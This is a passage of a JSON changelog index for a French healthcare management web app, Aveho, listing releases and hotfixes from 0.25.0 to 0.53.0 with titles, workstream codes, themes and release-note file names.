        "txt": "Email aux valideurs lors de la soumission d'achat"
      },
      {
        "code": "BK",
        "txt": "Comparaison périodes dans /statistiques-activite"
      },
      {
        "code": "BM",
        "txt": "Templates de signalements"
      },
      {
        "code": "BJ",
        "txt": "Mode compact pour les tables"
      },
      {
        "code": "BL",
        "txt": "Mentions légales / RGPD"
      },
      {
        "code": "BO",
        "txt": "Badge \"NEW\" dans le menu pour pages récentes"
      }
    ],
    "themes": [
      "rgpd",
      "achats",
      "ux",
      "notifications",
      "stats_dashboard",
      "documentation",
      "templates"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.53.0.html",
    "sqlFile": "aveho-PATCH-vers-0.53.sql"
  },
  {
    "v": "0.52.8",
    "kind": "hotfix",
    "titre": "Bug latent depuis la 0.38 (livrée il y a longtemps) — requête malformée silencieuse",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "Bug latent depuis la 0.38 (livrée il y a longtemps) — requête malformée silencie"
      }
    ],
    "themes": [
      "divers"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.52.8.html"
  },
  {
    "v": "0.52.7",
    "kind": "hotfix",
    "titre": "Erreurs 503 console nettoyées · 70 versions documentées dans /changelog (+5 récentes)",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "Erreurs 503 console nettoyées · 70 versions documentées dans /changelog (+5 réce"
      }
    ],
    "themes": [
      "documentation"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.52.7.html"
  },
  {
    "v": "0.52.6",
    "kind": "hotfix",
    "titre": "\"Le pop-up nouvelle annonce et pas top tout touche le bord\"",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "\"Le pop-up nouvelle annonce et pas top tout touche le bord\""
      }
    ],
    "themes": [
      "notifications"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.52.6.html"
  },
  {
    "v": "0.52.5",
    "kind": "version",
    "titre": "Annonce ciblable par établissement · audit responsive complet sur toutes les pages paramétrage",
    "chantiers": [],
    "themes": [
      "ux",
      "audit",
      "notifications"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.52.5.html",
    "sqlFile": "aveho-PATCH-vers-0.52.5.sql"
  },
  {
    "v": "0.52.4",
    "kind": "hotfix",
    "titre": "Audit complet 0.50→0.52.3, fix mobile sur 6 pages + bannière + 1 modal",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "Audit complet 0.50→0.52.3, fix mobile sur 6 pages + bannière + 1 modal"
      }
    ],
    "themes": [
      "ux",
      "audit",
      "notifications"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.52.4.html"
  },
  {
    "v": "0.52.3",
    "kind": "version",
    "titre": "Le changelog devient une vraie base de connaissance navigable",
    "chantiers": [
      {
        "code": "•",
        "txt": "📥 Téléchargement HTML par version"
      },
      {
        "code": "•",
        "txt": "🏷️ 17 thèmes catégorisés"
      },
      {
        "code": "•",
        "txt": "🎨 Bannière refondue (modal + carousel + snooze)"
      },
      {
        "code": "•",
        "txt": "📱 Bannière mobile en bas (safe-area iOS)"
      },
      {
        "code": "•",
        "txt": "🔍 Recherche sophistiquée"
      }
    ],
    "themes": [
      "ux",
      "notifications",
      "recherche",
      "documentation"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.52.3.html"
  },
  {
    "v": "0.52.2",
    "kind": "version",
    "titre": "65 entrées · 57 versions + 8 hotfix · Tout l'historique depuis le départ",
    "chantiers": [],
    "themes": [
      "audit"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.52.2.html"
  },
  {
    "v": "0.52.1",
    "kind": "hotfix",
    "titre": "Explication enfin du pattern récurrent \"la bannière n'apparaît pas après chaque MAJ\"",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "Explication enfin du pattern récurrent \"la bannière n'apparaît pas après chaque "
      }
    ],
    "themes": [
      "notifications"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.52.1.html"
  },
  {
    "v": "0.52.0",
    "kind": "version",
    "titre": "Logs applicatifs · Mode focus · Filtres audit prédéfinis · Métriques 7j · Dashboard digest · Recherche c:/f:",
    "chantiers": [
      {
        "code": "AK",
        "txt": "Logs applicatifs front"
      },
      {
        "code": "BD",
        "txt": "Métriques 7j sur page statut"
      },
      {
        "code": "BE",
        "txt": "Filtres audit prédéfinis (presets)"
      },
      {
        "code": "BF",
        "txt": "Dashboard digest notifications"
      },
      {
        "code": "BG",
        "txt": "Mode focus (Esc Esc)"
      },
      {
        "code": "G",
        "txt": "Recherche c: et f:"
      }
    ],
    "themes": [
      "audit",
      "notifications",
      "stats_dashboard",
      "recherche"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.52.0.html",
    "sqlFile": "aveho-PATCH-vers-0.52.sql"
  },
  {
    "v": "0.51.0",
    "kind": "version",
    "titre": "Statut système · Stats annonces · Recherche audit · Validations en attente · Migration confirm() finale",
    "chantiers": [
      {
        "code": "AQ",
        "txt": "Statut système — page de monitoring"
      },
      {
        "code": "AZ",
        "txt": "Statistiques annonces"
      },
      {
        "code": "BA",
        "txt": "Recherche audit étendue"
      },
      {
        "code": "BB",
        "txt": "Mes validations en attente (widget accueil)"
      },
      {
        "code": "AA",
        "txt": "Migration confirm() — FINALE"
      }
    ],
    "themes": [
      "audit",
      "notifications",
      "stats_dashboard",
      "recherche"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.51.0.html",
    "sqlFile": "aveho-PATCH-vers-0.51.sql"
  },
  {
    "v": "0.50.0",
    "kind": "version",
    "titre": "Workflow achat double validation · Annonces internes · Filtres audit · Migration confirm() · Changelog",
    "chantiers": [
      {
        "code": "AO",
        "txt": "Annonces internes (broadcast admin → users)"
      },
      {
        "code": "AS",
        "txt": "Workflow achat — double validation"
      },
      {
        "code": "AT",
        "txt": "Filtres avancés audit log"
      },
      {
        "code": "AA",
        "txt": "Migration confirm() — phase finale"
      }
    ],
    "themes": [
      "achats",
      "audit",
      "notifications",
      "documentation"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.50.0.html",
    "sqlFile": "aveho-PATCH-vers-0.50.sql"
  },
  {
    "v": "0.49.6",
    "kind": "hotfix",
    "titre": "Empêcher l'avatar utilisateur de sortir de l'écran sans casser les dropdowns",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "Empêcher l'avatar utilisateur de sortir de l'écran sans casser les dropdowns"
      }
    ],
    "themes": [
      "divers"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.49.6.html"
  },
  {
    "v": "0.49.5",
    "kind": "hotfix",
    "titre": "VersionCheck reload réel · dropdown coupé par overflow · bouton install toujours visible",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "VersionCheck reload réel · dropdown coupé par overflow · bouton install toujours"
      }
    ],
    "themes": [
      "divers"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.49.5.html"
  },
  {
    "v": "0.49.2",
    "kind": "hotfix",
    "titre": "Hydration mismatch · UX mobile (avatar hors écran) · documentation PowerShell",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "Hydration mismatch · UX mobile (avatar hors écran) · documentation PowerShell"
      }
    ],
    "themes": [
      "ux",
      "documentation"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.49.2.html"
  },
  {
    "v": "0.49.0",
    "kind": "version",
    "titre": "Badge version · Multi-établissements · Bulk transferts · Notifs catégorie · Onboarding admin · Migration confirm()",
    "chantiers": [
      {
        "code": "AY",
        "txt": "Multi-établissements page accueil"
      },
      {
        "code": "AC",
        "txt": "Bulk transferts (autres déjà OK via Crud)"
      },
      {
        "code": "AV",
        "txt": "Notifications par catégorie"
      },
      {
        "code": "AD",
        "txt": "Onboarding par rôle"
      },
      {
        "code": "AA",
        "txt": "Migration 8 confirm() vers dialogs.confirm()"
      }
    ],
    "themes": [
      "ux",
      "audit",
      "notifications",
      "rls_securite",
      "transferts"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.49.0.html"
  },
  {
    "v": "0.48.1",
    "kind": "hotfix",
    "titre": "Élimine les 8 erreurs 503 dans la console quand on est hors-ligne",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "Élimine les 8 erreurs 503 dans la console quand on est hors-ligne"
      }
    ],
    "themes": [
      "divers"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.48.1.html"
  },
  {
    "v": "0.48.0",
    "kind": "version",
    "titre": "Vérif version live · Vue 360° patient enrichie · Drawer mobile swipe",
    "chantiers": [
      {
        "code": "AP",
        "txt": "Vérification de version dispo"
      },
      {
        "code": "AR",
        "txt": "Vue 360° patient enrichie"
      },
      {
        "code": "AW",
        "txt": "Drawer mobile — swipe-to-close"
      }
    ],
    "themes": [
      "ux",
      "patients",
      "realtime"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.48.0.html"
  },
  {
    "v": "0.47.0",
    "kind": "version",
    "titre": "Dashboard direction · Webhooks UI · Push API étendu · Diff visuel · Page offline · InstallBanner",
    "chantiers": [
      {
        "code": "AM",
        "txt": "Dashboard direction multi-structures"
      },
      {
        "code": "AN",
        "txt": "Page /webhooks dédiée"
      },
      {
        "code": "AB",
        "txt": "Push API câblé sur cron + digest"
      },
      {
        "code": "AH",
        "txt": "ConflictResolver — diff visuel word-level"
      },
      {
        "code": "AG",
        "txt": "Page /offline polie"
      },
      {
        "code": "AL",
        "txt": "InstallBanner refonte"
      }
    ],
    "themes": [
      "pwa",
      "notifications",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.47.0.html",
    "sqlFile": "aveho-PATCH-vers-0.47.sql"
  },
  {
    "v": "0.46.0",
    "kind": "version",
    "titre": "pg_stat_statements · Bulk patients · Calendrier RGPD · Sections rétractables · dialogs.confirm() · Push API · Onboarding tour",
    "chantiers": [
      {
        "code": "Y",
        "txt": "pg_stat_statements + dashboard /admin-perf"
      },
      {
        "code": "X",
        "txt": "Bulk patients — actions sur sélection multiple"
      },
      {
        "code": "U",
        "txt": "Calendrier signatures RGPD"
      },
      {
        "code": "W",
        "txt": "CollapsibleSection + /profil refondu"
      },
      {
        "code": "P",
        "txt": "dialogs.confirm() / alert() singleton"
      },
      {
        "code": "Q",
        "txt": "Push browser API câblé sur signalements"
      },
      {
        "code": "T",
        "txt": "Onboarding tour 4 étapes"
      }
    ],
    "themes": [
      "rgpd",
      "ux",
      "audit",
      "notifications",
      "patients",
      "perf_qualite",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.46.0.html",
    "sqlFile": "aveho-PATCH-vers-0.46.sql"
  },
  {
    "v": "0.46.0",
    "kind": "hotfix",
    "titre": "Crossover lib/↔app/ + router non importé dans /profil",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "Crossover lib/↔app/ + router non importé dans /profil"
      }
    ],
    "themes": [
      "divers"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.46.0.html",
    "sqlFile": "aveho-PATCH-vers-0.46.sql"
  },
  {
    "v": "0.45.0",
    "kind": "version",
    "titre": "Notif email signalement · Realtime étendu · Cron hebdo · Audit a11y · Modales réutilisables",
    "chantiers": [
      {
        "code": "B",
        "txt": "Notif email auteur signalement"
      },
      {
        "code": "K",
        "txt": "Realtime étendu — maintenances, transferts, commandes"
      },
      {
        "code": "L",
        "txt": "Cron weekly-stats-digest"
      },
      {
        "code": "J",
        "txt": "Audit a11y complet sur 6 pages"
      },
      {
        "code": "N",
        "txt": "Refactor — modales réutilisables"
      }
    ],
    "themes": [
      "achats",
      "ux",
      "audit",
      "notifications",
      "maintenance",
      "perf_qualite",
      "realtime",
      "stats_dashboard",
      "transferts"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.45.0.html"
  },
  {
    "v": "0.44.0",
    "kind": "version",
    "titre": "Activation groupée RGPD · Realtime DI/signalements/achats · Cron récurrences · Indexes SQL · Audit a11y",
    "chantiers": [
      {
        "code": "J",
        "txt": "Activation groupée templates RGPD"
      },
      {
        "code": "K",
        "txt": "Realtime sur DI, signalements, achats"
      },
      {
        "code": "L",
        "txt": "Cron auto-génération récurrences maintenance"
      },
      {
        "code": "M",
        "txt": "Audit perf + 19 indexes SQL"
      },
      {
        "code": "O",
        "txt": "Audit accessibilité (a11y)"
      }
    ],
    "themes": [
      "rgpd",
      "achats",
      "audit",
      "maintenance",
      "perf_qualite",
      "realtime",
      "templates"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.44.0.html",
    "sqlFile": "aveho-PATCH-vers-0.44.sql"
  },
  {
    "v": "0.43.0",
    "kind": "version",
    "titre": "Stats DI · Calendrier maintenance · Realtime · Duplication templates · Audit heatmap · Récurrences maintenance",
    "chantiers": [
      {
        "code": "N",
        "txt": "Dashboard statistiques DI"
      },
      {
        "code": "M",
        "txt": "Vue calendrier mensuelle maintenances"
      },
      {
        "code": "L",
        "txt": "Notification temps réel Supabase"
      },
      {
        "code": "K",
        "txt": "Duplication templates RGPD multi-établissements"
      },
      {
        "code": "J",
        "txt": "Heatmap temporel sur /audit"
      },
      {
        "code": "A",
        "txt": "CRUD récurrences maintenance"
      }
    ],
    "themes": [
      "rgpd",
      "audit",
      "notifications",
      "maintenance",
      "realtime",
      "stats_dashboard",
      "infrastructure",
      "templates"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.43.0.html",
    "sqlFile": "aveho-PATCH-vers-0.43.sql"
  },
  {
    "v": "0.43.0",
    "kind": "hotfix",
    "titre": "Vues stats DI invisibles côté API + duplication templates RGPD bloquée",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "Vues stats DI invisibles côté API + duplication templates RGPD bloquée"
      }
    ],
    "themes": [
      "rgpd",
      "stats_dashboard",
      "templates"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.43.0.html",
    "sqlFile": "aveho-PATCH-vers-0.43.sql"
  },
  {
    "v": "0.42.0",
    "kind": "version",
    "titre": "Templates RGPD par établissement · Digest historique · Audit log UI · Timeline DI fiche patient · Mode présentation TV",
    "chantiers": [
      {
        "code": "I",
        "txt": "Templates RGPD par établissement"
      },
      {
        "code": "J",
        "txt": "Digest — historique des envois"
      },
      {
        "code": "K",
        "txt": "Page /audit dédiée"
      },
      {
        "code": "L",
        "txt": "Timeline DI sur fiche patient"
      },
      {
        "code": "M",
        "txt": "Mode présentation TV de service"
      }
    ],
    "themes": [
      "rgpd",
      "audit",
      "notifications",
      "patients",
      "templates"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.42.0.html",
    "sqlFile": "aveho-PATCH-vers-0.42.sql"
  },
  {
    "v": "0.41.0",
    "kind": "version",
    "titre": "Drill heatmap RGPD · Digest test · Preview kanban · Workflow signalements · Stats maintenances · Widget \"À traiter\"",
    "chantiers": [
      {
        "code": "I",
        "txt": "Drill-down heatmap signatures RGPD"
      },
      {
        "code": "J",
        "txt": "Digest — test depuis /profil"
      },
      {
        "code": "K",
        "txt": "DIPreview dans Kanban"
      },
      {
        "code": "H",
        "txt": "Signalements — workflow avancé"
      },
      {
        "code": "L",
        "txt": "Maintenances — stats par type + récurrences"
      },
      {
        "code": "A",
        "txt": "Accueil — widget \"À traiter\""
      }
    ],
    "themes": [
      "rgpd",
      "notifications",
      "maintenance",
      "perf_qualite",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.41.0.html",
    "sqlFile": "aveho-PATCH-vers-0.41.sql"
  },
  {
    "v": "0.41.0",
    "kind": "hotfix",
    "titre": "Erreurs SQL au déploiement + 1 test DST → tout fixé",
    "chantiers": [
      {
        "code": "Fix",
        "txt": "Erreurs SQL au déploiement + 1 test DST → tout fixé"
      }
    ],
    "themes": [
      "perf_qualite",
      "infrastructure"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.41.0.html",
    "sqlFile": "aveho-PATCH-vers-0.41.sql"
  },
  {
    "v": "0.40.0",
    "kind": "version",
    "titre": "Digest email · Signalements votes + catégories · Stats RGPD enrichies · Variables custom RGPD · Preview étendus",
    "chantiers": [
      {
        "code": "F",
        "txt": "Notifications digest (email récap automatique)"
      },
      {
        "code": "K",
        "txt": "Signalements enrichis : votes + catégories"
      },
      {
        "code": "L",
        "txt": "Stats RGPD enrichies (3 nouveaux blocs)"
      },
      {
        "code": "G",
        "txt": "Variables custom dans les templates RGPD"
      },
      {
        "code": "J",
        "txt": "PatientPreview étendu à /interventions"
      }
    ],
    "themes": [
      "rgpd",
      "notifications",
      "patients",
      "maintenance",
      "stats_dashboard",
      "templates"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.40.0.html",
    "sqlFile": "aveho-PATCH-vers-0.40.sql"
  },
  {
    "v": "0.39.0",
    "kind": "version",
    "titre": "EntityPreview générique · DIPreview + AchatPreview · Dernière DI lazy · Filtres avancés stats activité + CSV",
    "chantiers": [
      {
        "code": "•",
        "txt": "🧩 EntityPreview générique réutilisable"
      },
      {
        "code": "•",
        "txt": "🔧 DIPreview hover sur les numéros DI"
      },
      {
        "code": "•",
        "txt": "🛒 AchatPreview hover sur les numéros achats"
      },
      {
        "code": "•",
        "txt": "⚡ Dernière DI fetchée lazy au hover patient"
      },
      {
        "code": "•",
        "txt": "🔍 Filtres avancés stats activité (etab / user / catégorie)"
      },
      {
        "code": "•",
        "txt": "📊 Export CSV brut audit_log (5000 lignes max)"
      }
    ],
    "themes": [
      "achats",
      "audit",
      "patients",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.39.0.html"
  },
  {
    "v": "0.38.0",
    "kind": "version",
    "titre": "Aperçu rapide patient au hover — popover contextuel, navigation accélérée",
    "chantiers": [
      {
        "code": "•",
        "txt": "🔍 Popover au survol nom patient (desktop)"
      },
      {
        "code": "•",
        "txt": "📱 Tap direct sur mobile (pas de hover)"
      },
      {
        "code": "•",
        "txt": "⏱️ Délai 500ms anti-flicker"
      },
      {
        "code": "•",
        "txt": "📊 Compteurs DI/achats préchargés"
      },
      {
        "code": "•",
        "txt": "🛡️ Badge RGPD intégré"
      },
      {
        "code": "•",
        "txt": "📍 Positionnement intelligent (bord d'écran)"
      }
    ],
    "themes": [
      "rgpd",
      "achats",
      "ux",
      "patients"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.38.0.html"
  },
  {
    "v": "0.37.0",
    "kind": "version",
    "titre": "Drill-down heatmap cliquable · Badges tendance N vs N-1 · RPC get_heatmap_drill",
    "chantiers": [
      {
        "code": "•",
        "txt": "📊 Vue v_stats_activite_global (mois courant vs précédent)"
      },
      {
        "code": "•",
        "txt": "🔍 RPC get_heatmap_drill pour détail par créneau"
      },
      {
        "code": "•",
        "txt": "🖱️ Heatmap cliquable avec modale drill-down"
      },
      {
        "code": "•",
        "txt": "📈 Composant TrendBadge réutilisable"
      },
      {
        "code": "•",
        "txt": "🎯 6 métriques de tendance sur stats activité"
      },
      {
        "code": "•",
        "txt": "🛡️ TrendBadge intégré aussi dans stats RGPD"
      }
    ],
    "themes": [
      "rgpd",
      "ux",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.37.0.html",
    "sqlFile": "aveho-PATCH-vers-0.37.sql"
  },
  {
    "v": "0.36.0",
    "kind": "version",
    "titre": "Icônes brandées · 13 splash iOS · InstallBanner contextuel · Optims touch + safe area",
    "chantiers": [
      {
        "code": "•",
        "txt": "📱 13 icônes brandées (16px → 512px)"
      },
      {
        "code": "•",
        "txt": "🚀 13 splash screens iOS (iPhone 8 → 14 Pro Max + iPad)"
      },
      {
        "code": "•",
        "txt": "⚙️ Manifest enrichi : shortcuts, categories, lang"
      },
      {
        "code": "•",
        "txt": "💬 InstallBanner contextuel (30s + snooze 7j)"
      },
      {
        "code": "•",
        "txt": "👆 Touch targets 44px (Apple/Google specs)"
      },
      {
        "code": "•",
        "txt": "🛡️ Safe area pour notch iPhone X+"
      }
    ],
    "themes": [
      "pwa"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.36.0.html"
  },
  {
    "v": "0.35.0",
    "kind": "version",
    "titre": "Fix doublon GlobalSearch · Bouton 🔍 visible · 2 nouvelles entités · Historique récent",
    "chantiers": [
      {
        "code": "•",
        "txt": "🩹 Fix doublon GlobalSearch dans TopBar"
      },
      {
        "code": "•",
        "txt": "🔍 Bouton search visible avec badge ⌘K"
      },
      {
        "code": "•",
        "txt": "🔄 Recherche transferts (préfixe t:)"
      },
      {
        "code": "•",
        "txt": "🔧 Recherche maintenances (préfixe x:)"
      },
      {
        "code": "•",
        "txt": "⏱️ Historique 6 dernières navigations (localStorage)"
      }
    ],
    "themes": [
      "ux",
      "audit",
      "maintenance",
      "transferts",
      "recherche"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.35.0.html"
  },
  {
    "v": "0.34.0",
    "kind": "version",
    "titre": "Sortie du template hardcodé · Éditeur markdown · Versionning + audit · Preview live",
    "chantiers": [
      {
        "code": "•",
        "txt": "📋 Table consent_templates avec versionning"
      },
      {
        "code": "•",
        "txt": "✍️ Éditeur markdown side-by-side preview"
      },
      {
        "code": "•",
        "txt": "🔢 Auto-incrément version (1.0 → 1.1)"
      },
      {
        "code": "•",
        "txt": "🛡️ Anti-suppression si utilisé (audit)"
      },
      {
        "code": "•",
        "txt": "⚙️ Trigger SQL : 1 seul actif par structure"
      },
      {
        "code": "•",
        "txt": "🩹 Fix SQL roles.systeme BOOLEAN"
      },
      {
        "code": "•",
        "txt": "🩹 Fix Modal props (open + size)"
      }
    ],
    "themes": [
      "rgpd",
      "ux",
      "audit",
      "realtime",
      "templates"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.34.0.html",
    "sqlFile": "aveho-PATCH-vers-0.34.sql"
  },
  {
    "v": "0.33.0",
    "kind": "version",
    "titre": "Edge Function send-email · Email template brandé · Opt-in par catégorie · Intégration logEvent",
    "chantiers": [
      {
        "code": "•",
        "txt": "📧 Edge Function send-email réutilisable"
      },
      {
        "code": "•",
        "txt": "🎨 Template HTML brandé Aveho (navy + teal)"
      },
      {
        "code": "•",
        "txt": "☑️ Opt-in par catégorie (push ON / email OFF par défaut)"
      },
      {
        "code": "•",
        "txt": "🔌 Relais auto depuis logEvent"
      },
      {
        "code": "•",
        "txt": "🛡️ XSS escape sur tous les champs dynamiques"
      }
    ],
    "themes": [
      "notifications",
      "templates"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.33.0.html",
    "sqlFile": "aveho-PATCH-vers-0.33.sql"
  },
  {
    "v": "0.32.0",
    "kind": "version",
    "titre": "Tracker signalements perso — opt-in created_by préservant l'anonymat par défaut",
    "chantiers": [
      {
        "code": "•",
        "txt": "☑️ Checkbox opt-in dans le form signalement"
      },
      {
        "code": "•",
        "txt": "📊 KPI \"Signalements signés\" de retour dans /profil"
      },
      {
        "code": "•",
        "txt": "👥 Compteur signalements dans stats activité"
      }
    ],
    "themes": [
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.32.0.html",
    "sqlFile": "aveho-PATCH-vers-0.32.sql"
  },
  {
    "v": "0.31.0",
    "kind": "version",
    "titre": "Statistiques d'activité — Top utilisateurs · Heatmap jour×heure · Export PDF",
    "chantiers": [
      {
        "code": "•",
        "txt": "📊 5 vues SQL d'agrégation activité"
      },
      {
        "code": "•",
        "txt": "🏆 Podium top 3 + jauges 4-10"
      },
      {
        "code": "•",
        "txt": "🗓️ Heatmap 7 jours × 24 heures"
      },
      {
        "code": "•",
        "txt": "📅 Sélecteur période 7/30/90 jours"
      },
      {
        "code": "•",
        "txt": "📄 Export PDF brandé"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL (150 lignes)"
      }
    ],
    "themes": [
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.31.0.html",
    "sqlFile": "aveho-PATCH-vers-0.31.sql"
  },
  {
    "v": "0.30.0",
    "kind": "version",
    "titre": "Dashboard collectif RGPD · Graphiques SVG natifs · KPIs avancés · Export PDF brandé",
    "chantiers": [
      {
        "code": "•",
        "txt": "📊 5 vues SQL d'agrégation"
      },
      {
        "code": "•",
        "txt": "📈 4 composants graphiques SVG natifs"
      },
      {
        "code": "•",
        "txt": "🎯 6 KPIs RGPD globaux"
      },
      {
        "code": "•",
        "txt": "🏥 Performance par établissement"
      },
      {
        "code": "•",
        "txt": "📄 Export PDF brandé Aveho"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL (194 lignes)"
      }
    ],
    "themes": [
      "rgpd",
      "perf_qualite",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.30.0.html",
    "sqlFile": "aveho-PATCH-vers-0.30.sql"
  },
  {
    "v": "0.29.1",
    "kind": "version",
    "titre": "Hotfix dashboard /profil — corrections des erreurs 400 et 404 sur audit_log et signalements",
    "chantiers": [
      {
        "code": "•",
        "txt": "🩹 Fix table audit_events → audit_log"
      },
      {
        "code": "•",
        "txt": "🩹 Fix signalements.user_id inexistant"
      },
      {
        "code": "•",
        "txt": "📋 Doc résolution erreur 503 Service Worker"
      }
    ],
    "themes": [
      "pwa",
      "audit",
      "stats_dashboard",
      "infrastructure"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.29.1.html"
  },
  {
    "v": "0.29.0",
    "kind": "version",
    "titre": "Filtres sticky localStorage · Préférences notif par user · Dashboard /profil enrichi",
    "chantiers": [
      {
        "code": "•",
        "txt": "🔖 useStickyState — filtres persistés par user"
      },
      {
        "code": "•",
        "txt": "🔔 7 catégories de notif configurables"
      },
      {
        "code": "•",
        "txt": "🌙 Heures silencieuses"
      },
      {
        "code": "•",
        "txt": "📊 Dashboard /profil : mes stats + historique"
      },
      {
        "code": "•",
        "txt": "⚙️ Filtrage push côté Edge Function"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL"
      }
    ],
    "themes": [
      "audit",
      "notifications",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.29.0.html",
    "sqlFile": "aveho-PATCH-vers-0.29.sql"
  },
  {
    "v": "0.28.0",
    "kind": "version",
    "titre": "Invalidation cache auto · Migration safeWrite quasi-totale · safeFetch sur signalements",
    "chantiers": [
      {
        "code": "•",
        "txt": "🧹 cacheInvalidate auto dans safeWrite"
      },
      {
        "code": "•",
        "txt": "📦 6 pages métier migrées (transferts, maintenance, panier...)"
      },
      {
        "code": "•",
        "txt": "🏷️ Tags + étiquettes via safeWrite"
      },
      {
        "code": "•",
        "txt": "🛡️ ConsentementRGPD offline-aware"
      },
      {
        "code": "•",
        "txt": "💾 safeFetch sur signalements"
      }
    ],
    "themes": [
      "rgpd",
      "pwa",
      "maintenance",
      "transferts"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.28.0.html"
  },
  {
    "v": "0.27.0",
    "kind": "version",
    "titre": "Cache lecture activé · Bandeau données obsolètes · Modale résolution conflit avec fusion champ par champ",
    "chantiers": [
      {
        "code": "•",
        "txt": "💾 safeFetch activé : patients + interventions + achats"
      },
      {
        "code": "•",
        "txt": "🟠 Bandeau \"données obsolètes\" sur 3 pages"
      },
      {
        "code": "•",
        "txt": "⚔️ Modale ConflictResolver avec 3 actions"
      },
      {
        "code": "•",
        "txt": "🎨 Fusion champ par champ (UI claire)"
      }
    ],
    "themes": [
      "achats",
      "ux",
      "patients",
      "maintenance"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.27.0.html"
  },
  {
    "v": "0.26.0",
    "kind": "version",
    "titre": "Migration safeWrite sur toutes pages critiques · Cache lecture IndexedDB · Détection conflit optimiste",
    "chantiers": [
      {
        "code": "•",
        "txt": "📵 Crud.js + achats + interventions + signalements offline-ready"
      },
      {
        "code": "•",
        "txt": "💾 Cache de lecture IndexedDB (TTL 7j)"
      },
      {
        "code": "•",
        "txt": "🛡️ Détection conflit optimiste (updated_at)"
      },
      {
        "code": "•",
        "txt": "📦 ~15 pages bénéficient via Crud"
      }
    ],
    "themes": [
      "achats",
      "pwa",
      "maintenance",
      "perf_qualite"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.26.0.html"
  },
  {
    "v": "0.25.0",
    "kind": "version",
    "titre": "Mode hors-ligne avec queue d'écritures IndexedDB + sync automatique à la reconnexion",
    "chantiers": [
      {
        "code": "•",
        "txt": "📴 Queue IndexedDB persistante"
      },
      {
        "code": "•",
        "txt": "🔄 Sync auto à la reconnexion"
      },
      {
        "code": "•",
        "txt": "📊 Modale détail \"actions en attente\""
      },
      {
        "code": "•",
        "txt": "🆔 UUID client pour INSERT offline"
      },
      {
        "code": "•",
        "txt": "🛠️ Helpers safeInsert/Update/Delete/Rpc"
      }
    ],
